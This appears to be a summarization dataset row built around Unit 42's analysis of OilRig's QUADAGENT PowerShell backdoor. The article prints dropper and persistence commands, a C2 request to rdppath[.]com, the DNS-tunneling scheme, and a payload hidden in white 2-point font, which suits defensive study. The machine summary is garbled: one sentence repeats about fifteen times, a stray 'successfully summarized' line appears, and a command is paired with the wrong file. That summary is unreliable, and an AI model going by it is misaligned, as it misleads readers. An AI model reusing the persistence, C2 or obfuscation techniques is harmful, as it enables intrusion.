command:Interaction.MsgBox(""An error occurred while processing your request. code(2343)"", MsgBoxStyle.Critical, null), 1 Interaction . MsgBox ( ""An error occurred while processing your request. code(2343)"" , MsgBoxStyle . Critical , null ) ,The dropper then writes the content of the payload which resides as plaintext in a resource within the .NET assembly to C:\Users\<username>\AppData\Local\Temp\SystemDiskClean.ps1. It will then execute it as a shell object:cmd.exe /c powershell -exec bypass -file ""C:\Users\Administrator\AppData\Local\Temp\SystemDiskClean.ps1"" 1 cmd . exe / c powershell - exec bypass - file ""C:\Users\Administrator\AppData\Local\Temp\SystemDiskClean.ps1""In the malicious macro attack, the same Office365DCOMCheck.ps1 script that was used in the PE version is used as the payload. When the document is opened, a lure image as shown as seen in Figure 2 is displayed in an attempt to coerce the victim to enable macros.When macros are enabled and run, the macro within the Word document searches the sections of the document to get the contents of the header using the following piece of code:Set rng = ActiveDocument.Sections(intSection).Headers(1).Range 1 Set rng = ActiveDocument . Sections ( intSection ) . Headers ( 1 ) . RangeThe code above obtains the contents of the header, which the macro will write to a file at C:\programdata\Office365DCOMCheck.ps1. The creator of the delivery document was able to visually hide the PowerShell script in the header by setting the text to a font size of 2 and font color of white, as seen in Figure 4.Figure 4. Hidden PowerShell script within the document's header using a small white fontThis technique of hiding malicious content by using a small white font is not unique to this threat group, as we recently observed the Sofacy group use this technique to hide DDE instructions within one of their delivery documents.";"The OilRig group continues to adapt their tactics and bolster their toolset with newly developed tools. The OilRig group (AKA APT34, Helix Kitten) is an adversary motivated by espionage primarily operating in the Middle East region. We first discovered this group in mid2016, although it is possible their operations extend earlier than that time frame. They have shown themselves to be an extremely persistent adversary that shows no signs of slowing down. Examining their past behaviors with current events only seems to indicate that the OilRig group's operations are likely to accelerate even further in the near future.Between May and June 2018, Unit 42 observed multiple attacks by the OilRig group appearing to originate from a government agency in the Middle East. Based on previously observed tactics, it is highly likely the OilRig group leveraged credential harvesting and compromised accounts to use the government agency as a launching platform for their true attacks.The targets in these attacks included a technology services provider as well as another government entity. Both these targets were in the same nationstate. Further, the attacks against these targets were made to appear to have originated from other entities in the same country. However, the actual attackers themselves were outside this country and likely used stolen credentials from the intermediary organization to carry out their attacks.The attacks delivered a PowerShell backdoor called QUADAGENT, a tool attributed to the OilRig group by both ClearSky Cyber Security and FireEye. In our own analysis, we were able to also confirm the attribution of this tool to the OilRig group by examining specific artifacts that were reused from tools previously used by the OilRig group in addition to tactics reused from previous attacks as The ITSecurity report has been successfully summarized. The OilRig group continues to be a persistent adversary group in the Middle East region. While their delivery techniques are fairly simple, the various tools we have attributed as part of their arsenal reveal sophistication. In this instance, they illustrated a typical behavior of adversary groups, wherein the same tool was reused in multiple attacks, but each had enough modifications via infrastructure change, additional obfuscation, and repackaging that each sample may appear different enough to bypass security controls. A key component to always remember is that for these type of adversary groups, they will follow the path of least resistance in their attacks, as long as their mission directive is accomplished. Palo Alto Networks customers may learn more and are protected via the following ways: WildFire classifies QUADAGENT samples as malicious QUADAGENT C2 Domains have been classified as malicious AutoFocus customers can track QUADAGENT via its corresponding tag IOCs SHA256 Hashes QUADAGENTd948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520d7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de5f001f3387ddfc0314446d0c950 The downloader will use the filename of the script (ex. AdobeAcrobatLicenseVerify.ps1) as the name of the PowerShell script it will download. The downloader will then download the PowerShell script from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The ITSecurity report states that the malware downloader will use the filename of the script (ex. Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task to maintain persistence on the victim host. To create the scheduled task, the PowerShell payload starts by writing the following to a VBScript file with the same name as the task name (ex. Office365DCOMCheck.vbs or SystemDiskClean.vbs) within the %TEMP% folder:CreateObject(""WScript.Shell"").Run """" & WScript.Arguments(0) & """", 0, False 1 CreateObject ( ""WScript.Shell"" ) . Run """" & WScript . Arguments ( 0 ) & """" , 0 , FalseThe scheduled task will then run every five minutes, which provides persistent execution of the downloader script. The task itself is fairly simple, calling the VBScript file which contains a PowerShell oneliner as an argument to run the QUADAGENT payload (ex. Office365DCOMCheck.ps1 and SystemDiskClean.ps1):wscript.exe ""Office365DCOMCheck.vbs"" \ "" PowerShell . exe ExecutionPolicy bypass WindowStyle hidden NoProfile '<current PowerShell script>' \ ""After setting up persistent access, the payload checks to see if a value exists within a registry key in the HKCU hive whose name is the same as the scheduled task (ex. Office365DCOMCheck or SystemDiskClean), such as the following:HKCU\Office365DCOMCheckThe payload uses this registry key to store a session identifier unique to the compromised system, as well as a preshared key used for encrypting and decrypting communications between the system and the C2 The payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a domain structured as:ns2.<same random number between 100000 and 999999>.<c2 name> The ITSecurity report states that the batch script will then rename Out.jpg to Office365DCOMCheck.ps1 and execute it with the following command: cmd.exe /c powershell exec bypass file ""C:\Users\Administrator\AppData\Local\Temp\SystemDiskClean.ps1""";en;{'r': 0.3064113238967527, 'p': 0.9484536082474226, 'f': 0.4631843890087016};{'r': 0.21356169171618317, 'p': 0.9078751857355126, 'f': 0.34578381129124663};{'r': 0.3064113238967527, 'p': 0.9484536082474226, 'f': 0.4631843890087016}
https://unit42.paloaltonetworks.com/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/;OilRig Targets Technology Service Provider and Government Agency with QUADAGENT;"This post is also available in: ??? (Japanese)The OilRig group continues to adapt their tactics and bolster their toolset with newly developed tools. The OilRig group (AKA APT34, Helix Kitten) is an adversary motivated by espionage primarily operating in the Middle East region. We first discovered this group in mid-2016, although it is possible their operations extends earlier than that time frame. They have shown themselves to be an extremely persistent adversary that shows no signs of slowing down. Examining their past behaviors with current events only seems to indicate that the OilRig group's operations are likely to accelerate even further in the near future.Between May and June 2018, Unit 42 observed multiple attacks by the OilRig group appearing to originate from a government agency in the Middle East. Based on previously observed tactics, it is highly likely the OilRig group leveraged credential harvesting and compromised accounts to use the government agency as a launching platform for their true attacks.The targets in these attacks included a technology services provider as well as another government entity. Both these targets were in the same nation-state. Further, the attacks against these targets were made to appear to have originated from other entities in the same country. However, the actual attackers themselves were outside this country and likely used stolen credentials from the intermediary organization to carry out their attacks.The attacks delivered a PowerShell backdoor called QUADAGENT, a tool attributed to the OilRig group by both ClearSky Cyber Security and FireEye. In our own analysis, we were able to also confirm the attribution of this tool to the OilRig group by examining specific artifacts that were reused from tools previously used by the OilRig group in addition to tactics reused from previous attacks as well. The use of script-based backdoors is a common technique used by the OilRig group as we have previously documented. However, packaging these scripts into a portable executable (PE) file is not a tactic we have seen the OilRig group use frequently. Detailed analysis of QUADAGENT and its ties to Oilrig is the appendix at the end of this blog. QUADAGENT is the 12th custom built tool that Unit 42 has documented the OilRig group using for their attacks.Our analysis revealed the two QUADAGENT PE files we obtained were slightly different from each other. Primarily, one used a Microsoft .NET Framework-based dropper that also opens a decoy dialog box, which can be seen in Figure 1. The other sample was a PE file generated via a bat2exe tool.SHA256 Filename PowerShell Filename Variant 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63 <redacted> Technical Services.exe Office365DCOMCheck.ps1 Bat2exe d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520 tafahom.exe, Sales Modification.exe SystemDiskClean.ps1 .NETTable 1. QUADAGENT PE FilesThe QUADAGENT backdoors dropped onto the hosts were nearly identical to each other, with the only differences being the command and control server (C2) and randomized obfuscation. We were also able to locate a third delivery package of the QUADAGENT backdoor as reported by ClearSky Cyber Security. In their example, the OilRig group used a malicious macro document to deliver the backdoor, which is a tactic much more commonly used by them.A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation. This tool was originally intended to aid defenders in simulating obfuscated PowerShell commands to better their defenses. Invoke-Obfuscation has proven to be highly effective at obfuscating PowerShell scripts and in this case, the adversary was able to take advantage of the tool for increased chances of evasion and as an anti-analysis tactic.Attack DetailsThis latest attack consisted of three waves between May and June 2018. All three waves involved a single spear phishing email that appeared to originate from a government agency based in the Middle East. Based on our telemetry, we have high confidence the email account used to launch this attack was compromised by the OilRig group, likely via credential theft.In the two waves (May 30 and June 3) against the technology services provider, the victim email addresses were not easily discoverable via common search engines, indicating the targets were likely part of a previously collected target list, or possibly known associates of the compromised account used to send the attack emails. The malicious attachment was a simple PE file (SHA256: 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63) with the filename <redacted> Technical Services.exe. The file appears to have been compiled using a bat2exe tool, which will take batch files (.bat) and convert them to PE (.exe) files. Its sole purpose here is to install the QUADAGENT backdoor and execute it.Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes. The executable will drop the packaged QUADAGENT PowerShell script using the filename Office365DCOMCheck.ps1 in addition to a VBScript file with the same filename which will assist in the execution of it. A scheduled task is also generated to maintain persistence of the payload. Once the QUADAGENT payload has executed, it will use rdppath[.]com as the C2, first via HTTPS, then HTTP, then via DNS tunneling, each being used as a corresponding fallback channel if the former fails.The wave against the government entity (June 26) also involved a simple PE file attachment (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) using the filename tafahom.exe. This PE was slightly different from the other attack, being compiled using the Microsoft .NET Framework instead of being generated via a bat2exe tool and containing a decoy dialog box as shown in Figure 1.Figure 1. Decoy dialog boxThe tactic of using a decoy dialog box is commonly used by multiple adversaries and is generally deployed as a method to reduce suspicion by the victim. In comparison to being silently run, a victim may be less suspicious of a dialog/error message because they are provided what appears to be a legitimate error response when attempting to open the attachment. When a file is silently run, because there is no response to the user's action, a victim may be more suspicious or curious on what actually happened.After the .NET PE file has been run, we observed the same behavior as the above QUADAGENT sample of dropping a PowerShell script with the filename SystemDiskClean.ps1 alongside a VBScript file with the same name. The C2 techniques remained identical, with the only change being the server which became cpuproc[.]com.Using rdppath[.]com as a pivot point, we collected an additional QUADAGENT sample also communicating to this C2 (SHA256: d7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de), which was first reported by ClearSky Cyber Security. In contrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as the delivery vehicle. The use of malicious macro delivery documents is a tactic we have observed the OilRig group use repeatedly over the three years we've been tracking them. The actual QUADAGENT script payload used in the ClearSky sample was exactly the same as the one we found in the bat2exe version used against the aforementioned technical services provider. The delivery document also used a filename that could be related to other technology services or media organizations within that same nation state, although it is inconclusive. The document also contained a lure image, similar to ones commonly found in malicious macro documents which ask the user to click on ""Enable Content"" as seen in Figure 2. Unlike many other delivery documents used by this group, there was no additional decoy content after the macro was enabled.Figure 2. Lure image used to entice users to enable macrosUse of Open Source ToolsIn an attempt to avoid detection and as an anti-analysis tactic, the OilRig group abused an open source tool called Invoke-Obfuscation to obfuscate the code used for QUADAGENT. Invoke-Obfuscation is freely available via a Github repository and allows a user to change the visual representation of a PowerShell script simply by selecting the desired obfuscation techniques. Invoke-Obfuscation offers a variety of obfuscation techniques, and by analyzing the script we were able to ascertain the specific options in this attack. After identifying the specific options used to obfuscate QUADAGENT, we were able to deobfuscate the PowerShell script and perform additional analysis.We found two obfuscation techniques applied to the script: the first one changing the representation of variables, the second one changing the representation of strings in the script.Invoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks, which changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`) character, which is ignored in by PowerShell. Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex. ""{1}{0}"" -f 'bar','foo').During our analysis, we installed Invoke-Obfuscation and used it to obfuscate a previously collected QUADAGENT sample to confirm our analysis. We used the two previously mentioned obfuscation options within Invoke-Obfuscation on this QUADAGENT sample, which resulted in the generation of a very similar script as the Office365DCOMCheck.ps1 and SystemDiskClean.ps1 payloads delivered in the attacks discussed in this blog. We captured the commands we ran in Invoke-Obfuscation in the animation in Figure 3 below, which visualizes the steps the threat actor may have taken to create the payload delivered in this attack.Figure 3. Possible steps carried out in Invoke-Obfuscation on the QUADAGENT sampleConclusionThe OilRig group continues to be a persistent adversary group in the Middle East region. While their delivery techniques are fairly simple, the various tools we have attributed as part of their arsenal reveal sophistication. In this instance, they illustrated a typical behavior of adversary groups, wherein the same tool was reused in multiple attacks, but each had enough modifications via infrastructure change, additional obfuscation, and repackaging that each sample may appear different enough to bypass security controls. A key component to always remember is that for these type of adversary groups, they will follow the path of least resistance in their attacks, as long as their mission directive is accomplished.Palo Alto Networks customers may learn more and are protected via the following ways:WildFire classifies QUADAGENT samples as maliciousQUADAGENT C2 Domains have been classified as maliciousAutoFocus customers can track QUADAGENT via its corresponding tagIOCsSHA256 HashesQUADAGENTd948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520d7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63ThreeDollars1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9ccDomainsrdppath[.]comcpuproc[.]comacrobatverify[.]comFilenamesOffice365DCOMCheck.ps1Office365DCOMCheck.vbsSystemDiskClean.ps1SystemDiskClean.vbsAdobeAcrobatLicenseVerify.ps1c:\Users\<username>\AppData\Roaming\Out.jpgAppendixQUADAGENT Relationship to Other OilRig ToolsDuring our regular data gathering functions several months ago, we collected a delivery document (SHA256: 1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c) that contained an at-the-time an unknown payload which would be revealed to be QUADAGENT. While we do not have data supporting targeting information or telemetry, we know the document was created in January 2018 and likely used in an attack around that time frame. In addition, the delivery document shared metadata artifacts with the ThreeDollars delivery document (SHA256: 119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc) that OilRig used to deliver the ISMAgent payload in a targeted attack In January 2018 on a government entity in the Middle East.The QUADAGENT payload dropped by the delivery document had the filename AdobeAcrobatLicenseVerify.ps1 and used acrobatverify[.]comfor its C2. Examining the subdomains for acrobatverify[.]com reveals three subdomains, www, resolve, and dns. The passive DNS data for the subdomains shows an IP resolution of 185.162.235[.]121 from December 2017 through January 2018. Prior to this time period, we see several subdomains of msoffice-cdn[.]com, ns1, ns2, and www also resolving to this IP. This IP and msoffice-cdn[.]com were both previously referenced in our first report on an OilRig attack using the ThreeDollars delivery document.We used this QUADAGENT payload when testing the Invoke-Obfuscation tool mentioned in this blog. By applying two specific obfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this blog.QUADAGENT AnalysisThe final payload delivered in all three attack waves is a PowerShell downloader referred to by other research organizations as QUADAGENT. The downloaders in these attacks were configured to use both rdppath[.]com and cpuproc[.]com as their C2 servers. When communicating with its C2 server, the downloaders use multiple protocols, specifically HTTPS, HTTP or DNS, each of which provide a fallback channel in that order. For instance, the downloader will first attempt to communicate with its C2 server using an HTTPS request. If that HTTPS request is not successful, the downloader will issue an HTTP request. Lastly, if the HTTP request is not successful, the downloader will fallback to using DNS tunneling to establish communications. We provide more on the specific usage of these protocols as we discuss the inner workings of this malware in this section.The downloader will use the filename of the script (ex. Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task to maintain persistence on the victim host. To create the scheduled task, the PowerShell payload starts by writing the following to a VBScript file with the same name as the task name (ex. Office365DCOMCheck.vbs or SystemDiskClean.vbs) within the %TEMP% folder:CreateObject(""WScript.Shell"").Run """" & WScript.Arguments(0) & """", 0, False 1 CreateObject ( ""WScript.Shell"" ) . Run """" & WScript . Arguments ( 0 ) & """" , 0 , FalseThe scheduled task will then run every five minutes, which provides persistent execution of the downloader script. The task itself is fairly simple, calling the VBScript file which contains a PowerShell one-liner as an argument to run the QUADAGENT payload (ex. Office365DCOMCheck.ps1 and SystemDiskClean.ps1):wscript.exe ""Office365DCOMCheck.vbs"" \""PowerShell.exe -ExecutionPolicy bypass -WindowStyle hidden -NoProfile '<current PowerShell script>' \"" 1 wscript . exe ""Office365DCOMCheck.vbs"" \ "" PowerShell . exe - ExecutionPolicy bypass - WindowStyle hidden - NoProfile '<current PowerShell script>' \ ""After setting up persistent access, the payload checks to see if a value exists within a registry key in the HKCU hive whose name is the same as the scheduled task (ex. Office365DCOMCheck or SystemDiskClean), such as the following:HKCU\Office365DCOMCheckThe payload uses this registry key to store a session identifier unique to the compromised system, as well as a pre-shared key used for encrypting and decrypting communications between the system and the C2 server. This registry key is empty upon the first execution of the payload. The payload will communicate with its C2 server to obtain the session ID and pre-shared key and write it to this registry key in the following format:<session id>_<pre-shared key>To obtain the session ID and pre-shared key, the payload will first try to contact the C2 via an HTTPS GET request to the following URL:hxxps://www.rdppath[.]com/If the above request using HTTPS does not result in an HTTP 200 OK message or the response data has no alphanumeric characters, the code will attempt to communicate with the C2 server using HTTP via the following URL:hxxp://www.rdppath[.]com/The code to communicate with the C2 via HTTP exists within an exception handler. To trigger this, if the HTTPS requests do not work, the payload attempts to cause an exception by dividing 1 by 0. This exception invokes the exception handler containing the HTTP communication code, allowing it to run.If either attempt is successful, the C2 server will respond with the session ID and a pre-shared key in cleartext, which it will save to the previously mentioned registry key. The C2 server will provide the pre-shared key within the response data and will provide the session ID value via the Set-Cookie field within the response, specifically the string after the PHPSESSID parameter of the cookie.If both attempts fail and the payload is unable to obtain a session ID and pre-shared key via HTTP or HTTPS, it will try to use DNS tunneling. To obtain the session ID and pre-shared key, the payload will issue a query to resolve the following domain:mail.<random number between 100000 and 999999>.<c2 name>This request notifies the C2 server that the payload is about to send system specific data as part of the initial handshake. The script gathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following format:<domain>\<username>:passThe above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and replaces them with domain safe values (01, 02 and 03 respectively).<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name>After obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to treat as a command. The script will first attempt to communicate with the C2 server using HTTPS (HTTP if unsuccessful), which involves GET requests using the session ID within the request's cookie in the PHPSESSID field, as seen in the example GET request:GET / HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0, Win64, x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246 Host: www.rdppath[.]com Cookie: PHPSESSID=<c2 provided session id> Connection: Keep-Alive 1 2 3 4 5 GET / HTTP / 1.1 User - Agent : Mozilla / 5.0 ( Windows NT 10.0 , Win64 , x64 ) AppleWebKit / 537.36 ( KHTML , like Gecko ) Chrome / 42.0.2311.135 Safari / 537.36 Edge / 12.246 Host : www . rdppath [ . ] com Cookie : PHPSESSID = < c2 provided session id > Connection : Keep - AliveIf the payload is unable to reach the C2 via HTTPS/HTTP, the payload yet again falls back to DNS tunneling. The payload will issue a DNS query to the following domain to notify the C2 that it is about to send it data (session ID value) to it in a subsequent query:ns1.<random number between 100000 and 999999>.<c2 name>The payload does nothing with the C2 server's response to the query. Instead, it immediately issues a query to resolve the following domain, which embeds the session ID value to transmit it to the C2:<encoded session id>.<same random number between 100000 and 999999>.<c2 domain name>To transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers. The script will send the specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script will treat as a string of data:www.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name>The payload will treat the data provided by the C2 as a message, which will have the following structure:hello<char uuid[35]><char type[1]><data>The message will start with the string hello followed by a 35-character UUID string. The type field specifies the command that the payload will handle. This specific variant of the payload can only handle one command type, x. The data field within the message is a string of custom base64 encoded data that the malware decodes using the same custom base64 routine mentioned earlier and decrypts it using AES and the pre-shared key. The x command treats the supplied data as a PowerShell script that it will write to the current PowerShell script (Office365DCOMCheck.ps1/SystemDiskClean.ps1), effectively overwriting the initial PowerShell script with a secondary payload script. Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean scheduled task. It will run the newly downloaded PowerShell script by running the following command via cmd /c:wscript.exe ""Office365DCOMCheck.vbs"" ""PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>"" 1 wscript . exe ""Office365DCOMCheck.vbs"" ""PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>""The payload will then notify the C2 it has successfully downloaded and executed the secondary PowerShell payload. It does so using either the HTTPS/HTTP or DNS channels, depending on which method is successful. The payload will construct a message that has the following structure that it will then send to the C2:bye<char uuid[35]>dThe message above is sent via a simple HTTPS/HTTP POST request to the C2 server. If that fails, the payload will use DNS tunneling by first issuing a DNS query to resolve the following domain to notify the C2 that the payload will send data to it in subsequent DNS queries:ns1.<random number between 100000 and 999999>.<c2 name>The payload will then split the message up into 60-byte chunks (only 1 in this case), which it will send to the C2 via DNS queries to resolve domains structured as:<encoded/encrypted data of message>.<same random number between 100000 and 999999>.<c2 name>The payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a domain structured as:ns2.<same random number between 100000 and 999999>.<c2 name>Package Comparison of the QUADAGENT SamplesThe bat2exe version (SHA256: 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63)has a batch script, PowerShell script, and associated file names embedded within several resources that it will decrypt using RC4 and various MD5 hashes for keys. The executable obtains an embedded PowerShell script, decrypts it using RC4, then decompresses it using ZLIB, and saves the cleartext to C:\Users\<username>\AppData\Roaming\Out.jpg. The batch script will then rename Out.jpg to Office365DCOMCheck.ps1 and execute it with the following command:@shift /0 rename Out.jpg Office365DCOMCheck.ps1 PowerShell -exec bypass -File .\Office365DCOMCheck.ps1 1 2 3 @ shift / 0 rename Out . jpg Office365DCOMCheck . ps1 PowerShell - exec bypass - File . \ Office365DCOMCheck . ps1The .NET variant (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) is even simpler. This dropper starts by displaying the dialog box in Figure 1, previously shown and discussed with the following command:Interaction.MsgBox(""An error occurred while processing your request. code(2343)"", MsgBoxStyle.Critical, null), 1 Interaction . MsgBox ( ""An error occurred while processing your request. code(2343)"" , MsgBoxStyle . Critical , null ) ,The dropper then writes the content of the payload which resides as plaintext in a resource within the .NET assembly to C:\Users\<username>\AppData\Local\Temp\SystemDiskClean.ps1. It will then execute it as a shell object:cmd.exe /c powershell -exec bypass -file ""C:\Users\Administrator\AppData\Local\Temp\SystemDiskClean.ps1"" 1 cmd . exe / c powershell - exec bypass - file ""C:\Users\Administrator\AppData\Local\Temp\SystemDiskClean.ps1""In the malicious macro attack, the same Office365DCOMCheck.ps1 script that was used in the PE version is used as the payload. When the document is opened, a lure image as shown as seen in Figure 2 is displayed in an attempt to coerce the victim to enable macros.When macros are enabled and run, the macro within the Word document searches the sections of the document to get the contents of the header using the following piece of code:Set rng = ActiveDocument.Sections(intSection).Headers(1).Range 1 Set rng = ActiveDocument . Sections ( intSection ) . Headers ( 1 ) . RangeThe code above obtains the contents of the header, which the macro will write to a file at C:\programdata\Office365DCOMCheck.ps1. The creator of the delivery document was able to visually hide the PowerShell script in the header by setting the text to a font size of 2 and font color of white, as seen in Figure 4.Figure 4. Hidden PowerShell script within the document's header using a small white fontThis technique of hiding malicious content by using a small white font is not unique to this threat group, as we recently observed the Sofacy group use this technique to hide DDE instructions within one of their delivery documents.";"The OilRig group continues to adapt their tactics and bolster their toolset with newly developed tools. The OilRig group (AKA APT34, Helix Kitten) is an adversary motivated by espionage primarily operating in the Middle East region. We first discovered this group in mid2016, although it is possible their operations extend earlier than that time frame. They have shown themselves to be an extremely persistent adversary that shows no signs of slowing down. Examining their past behaviors with current events only seems to indicate that the OilRig group's operations are likely to accelerate even further in the near future.Between May and June 2018, Unit 42 observed multiple attacks by the OilRig group appearing to originate from a government agency in the Middle East. Based on previously observed tactics, it is highly likely the OilRig group leveraged credential harvesting and compromised accounts to use the government agency as a launching platform for their true attacks.The targets in these attacks included a technology services provider as well as another government entity. Both these targets were in the same nationstate. Further, the attacks against these targets were made to appear to have originated from other entities in the same country. However, the actual attackers themselves were outside this country and likely used stolen credentials from the intermediary organization to carry out their attacks.The attacks delivered a PowerShell backdoor called QUADAGENT, a tool attributed to the OilRig group by both ClearSky Cyber Security and FireEye. In our own analysis, we were able to also confirm the attribution of this tool to the OilRig group by examining specific artifacts that were reused from tools previously used by the OilRig group in addition to tactics reused from previous attacks as The ITSecurity report has been successfully summarized. The OilRig group continues to be a persistent adversary group in the Middle East region. While their delivery techniques are fairly simple, the various tools we have attributed as part of their arsenal reveal sophistication. In this instance, they illustrated a typical behavior of adversary groups, wherein the same tool was reused in multiple attacks, but each had enough modifications via infrastructure change, additional obfuscation, and repackaging that each sample may appear different enough to bypass security controls. A key component to always remember is that for these type of adversary groups, they will follow the path of least resistance in their attacks, as long as their mission directive is accomplished. Palo Alto Networks customers may learn more and are protected via the following ways: WildFire classifies QUADAGENT samples as malicious QUADAGENT C2 Domains have been classified as malicious AutoFocus customers can track QUADAGENT via its corresponding tag IOCs SHA256 Hashes QUADAGENTd948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520d7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de5f001f3387ddfc0314446d0c950 The downloader will use the filename of the script (ex. AdobeAcrobatLicenseVerify.ps1) as the name of the PowerShell script it will download. The downloader will then download the PowerShell script from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The PowerShell script will then download the payload from the C2 server and execute it on the victim's system. The ITSecurity report states that the malware downloader will use the filename of the script (ex. Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task to maintain persistence on the victim host. To create the scheduled task, the PowerShell payload starts by writing the following to a VBScript file with the same name as the task name (ex. Office365DCOMCheck.vbs or SystemDiskClean.vbs) within the %TEMP% folder:CreateObject(""WScript.Shell"").Run """" & WScript.Arguments(0) & """", 0, False 1 CreateObject ( ""WScript.Shell"" ) . Run """" & WScript . Arguments ( 0 ) & """" , 0 , FalseThe scheduled task will then run every five minutes, which provides persistent execution of the downloader script. The task itself is fairly simple, calling the VBScript file which contains a PowerShell oneliner as an argument to run the QUADAGENT payload (ex. Office365DCOMCheck.ps1 and SystemDiskClean.ps1):wscript.exe ""Office365DCOMCheck.vbs"" \ "" PowerShell . exe ExecutionPolicy bypass WindowStyle hidden NoProfile '<current PowerShell script>' \ ""After setting up persistent access, the payload checks to see if a value exists within a registry key in the HKCU hive whose name is the same as the scheduled task (ex. Office365DCOMCheck or SystemDiskClean), such as the following:HKCU\Office365DCOMCheckThe payload uses this registry key to store a session identifier unique to the compromised system, as well as a preshared key used for encrypting and decrypting communications between the system and the C2 The payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a domain structured as:ns2.<same random number between 100000 and 999999>.<c2 name> The ITSecurity report states that the batch script will then rename Out.jpg to Office365DCOMCheck.ps1 and execute it with the following command: cmd.exe /c powershell exec bypass file ""C:\Users\Administrator\AppData\Local\Temp\SystemDiskClean.ps1""";en;{'r': 0.3064113238967527, 'p': 0.9484536082474226, 'f': 0.4631843890087016};{'r': 0.21356169171618317, 'p': 0.9078751857355126, 'f': 0.34578381129124663};{'r': 0.3064113238967527, 'p': 0.9484536082474226, 'f': 0.4631843890087016}
